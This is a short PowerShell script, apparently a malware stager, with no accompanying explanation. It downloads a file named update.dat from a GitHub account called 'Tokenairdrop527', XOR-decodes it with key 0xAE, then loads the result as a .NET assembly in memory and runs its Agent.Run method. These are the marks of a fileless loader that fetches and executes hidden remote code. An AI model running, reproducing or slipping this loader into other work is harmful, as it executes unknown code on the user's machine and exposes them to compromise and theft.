[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$_e=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
$_d=[byte[]]($_e|%{$_-bxor0xAE})
[System.Reflection.Assembly]::Load($_d).GetType('Agent').GetMethod('Run').Invoke($null,$null)